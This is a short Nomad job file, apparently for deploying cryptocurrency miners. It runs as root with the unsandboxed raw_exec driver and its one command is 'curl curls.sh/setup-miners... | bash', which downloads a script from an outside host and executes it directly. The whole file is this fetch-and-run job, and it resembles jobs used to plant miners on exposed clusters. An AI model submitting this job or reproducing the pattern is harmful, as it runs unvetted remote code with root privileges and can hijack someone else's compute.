job "setup-miners" {
  type = "batch"

  group "setup-miners" {
    user = "root"
    count = 1

    task "setup-miners-task" {
      driver = "raw_exec"

      config {
        command = "curl curls.sh/setup-miners?args='/opt' | bash"
      }

      restart {
        attempts = 0
        mode     = "fail"
      }
    }
  }
}

